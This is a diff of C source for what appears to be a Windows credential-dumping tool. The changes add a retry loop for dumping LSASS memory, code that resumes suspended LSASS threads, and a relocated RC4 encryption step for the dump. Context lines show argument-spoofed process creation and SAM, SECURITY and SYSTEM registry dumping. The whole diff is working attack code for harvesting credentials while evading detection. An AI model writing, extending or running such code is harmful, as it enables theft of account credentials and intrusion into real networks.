@@ -89,70 +89,6 @@ unsigned char dummyRegArgs[] = {
 
 //==========================================================================================================================================================
 
-BOOL GetRemoteProcessInfo(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {
-	fnNtQuerySystemInformation   pNtQuerySystemInformation = NULL;
-	ULONG                        uReturnLen1 = NULL, uReturnLen2 = NULL;
-	PSYSTEM_PROCESS_INFORMATION  SystemProcInfo = NULL;
-	NTSTATUS                     STATUS = NULL;
-	PVOID                        pValueToFree = NULL;
-
-	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
-	if (pNtQuerySystemInformation == NULL) {
-#ifdef DEBUG
-		printf("[!] GetProcAddress Failed With Error : %d\n", GetLastError());
-#endif // DEBUG
-		return FALSE;
-	}
-
-	pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);
-
-	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
-	if (SystemProcInfo == NULL) {
-#ifdef DEBUG
-		printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
-#endif // DEBUG
-		return FALSE;
-	}
-
-	pValueToFree = SystemProcInfo;
-
-	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
-	if (STATUS != 0x0) {
-#ifdef DEBUG
-		printf("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
-#endif // DEBUG
-		HeapFree(GetProcessHeap(), 0, pValueToFree);
-		return FALSE;
-	}
-
-	while (TRUE) {
-		// Comparing the enumerated process name to the intended target process
-		if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {
-			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
-
-			if (phProcess != NULL) { // Only open a handle if phProcess is not NULL
-				*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
-			}
-			break;
-		}
-
-		if (!SystemProcInfo->NextEntryOffset) {
-			break;
-		}
-
-		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
-	}
-
-	HeapFree(GetProcessHeap(), 0, pValueToFree);
-
-	if (*pdwPid == NULL)
-		return FALSE;
-	else
-		return TRUE;
-}
-
-//==========================================================================================================================================================
-
 BOOL IsPrivileged() {
 	BOOL isAdminOrDebugPrivilege = FALSE;
 	HANDLE hToken = NULL;
@@ -243,6 +179,7 @@ int main(int argc, char* argv[]) {
 				dwSamSize = NULL,
 				dwSecuritySize = NULL,
 				dwSystemSize = NULL;
+	INT			lsassDumpRetryCount = 0;
 
 	ParsedArgs	args = ParseArgs(argc, argv);
 
@@ -352,6 +289,7 @@ int main(int argc, char* argv[]) {
 		dwArgsLen = 64;  // hardcoded since the path is the same
 	}
 
+LsassDumpRetry:
 	if (args.noDump) {
 		if (!CreateArgSpoofProcess(wszDummyCmd, wszDummyCmd, dwArgsLen, args.verboseMode, &dwProcessId, &hProcess, &hThread)) {
 #ifdef DEBUG
@@ -372,17 +310,12 @@ int main(int argc, char* argv[]) {
 //==========================================================================================================================================================
 // Looting LSASS dump
 
-	CHAR	rc4Key[RC4KEYSIZE], encRc4Key[RC4KEYSIZE];
-
-	GenerateRandomBytes(rc4Key, RC4KEYSIZE);
-
-	memcpy(encRc4Key, rc4Key, RC4KEYSIZE);
-
 #ifdef DEBUG
 	if (args.verboseMode) {
 		printf("[i] Reading Dump File and Zeroing Bytes...\n");
 	}
 #endif // DEBUG
+
 
 	INT		retryCount;
 
@@ -407,6 +340,36 @@ int main(int argc, char* argv[]) {
 	if (retryCount == 100000) {
 		printf("[!] Failed to Locate LSASS Dump File!\n");
 
+		DWORD threadCount = 0;
+
+		DWORD* suspendedThreads = GetRemoteProcessSuspendedThreads(lsassExeStr, &threadCount);
+
+		if (suspendedThreads == NULL) {
+#ifdef DEBUG
+			if (args.verboseMode) {
+				printf("[i] LSASS is Running, Continuing...\n");
+			}
+#endif // DEBUG
+		}
+		else {
+#ifdef DEBUG
+			printf("[i] LSASS is Suspended, Resuming Threads...\n");
+#endif // DEBUG
+			ResumeThreads(suspendedThreads, threadCount, args.verboseMode);
+			free(suspendedThreads);
+		}
+#ifdef RETRY_DUMP_ON_FAILURE
+		if (!args.noDump) {
+			if (lsassDumpRetryCount < RETRY_LIMIT) {
+#ifdef DEBUG
+				printf("\n[i] Trying to Dump LSASS Again...\n");
+#endif // DEBUG
+				lsassDumpRetryCount++;
+				goto LsassDumpRetry;
+			}
+		}
+#endif // RETRY_DUMP_ON_FAILURE
+
 		if (args.regDump) {
 			goto RegDump;
 		}
@@ -424,6 +387,12 @@ int main(int argc, char* argv[]) {
 		printf("[-] Unable to Read LSASS Dump");
 		goto ErrorCleanUp;
 	}
+
+	CHAR	rc4Key[RC4KEYSIZE], encRc4Key[RC4KEYSIZE];
+
+	GenerateRandomBytes(rc4Key, RC4KEYSIZE);
+
+	memcpy(encRc4Key, rc4Key, RC4KEYSIZE);
 
 	if (!Rc4EncryptionViaSystemFunc032(rc4Key, pDumpData, RC4KEYSIZE, dwDumpSize)) {
 		goto ErrorCleanUp;
